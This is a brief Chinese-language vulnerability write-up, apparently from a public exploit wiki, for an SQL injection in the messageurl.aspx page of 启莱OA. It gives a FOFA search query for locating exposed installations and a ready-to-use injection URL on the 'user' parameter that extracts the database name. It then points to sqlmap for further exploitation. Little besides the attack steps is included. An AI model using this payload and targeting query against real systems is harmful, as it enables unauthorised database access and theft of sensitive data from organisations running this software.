# 启莱OA messageurl.aspx SQL注入漏洞

## 漏洞描述

启莱OA messageurl.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

> [!NOTE]
>
> 启莱OA

## FOFA

> [!NOTE]
>
> app="启莱OA"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/ql-1.png)

存在SQL注入的文件为 messageurl.aspx

```
http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1
```

![](http://wikioss.peiqi.tech/vuln/ql-2.png)

使用SQLmap对参数 user 进行注入

![](http://wikioss.peiqi.tech/vuln/ql-3.png)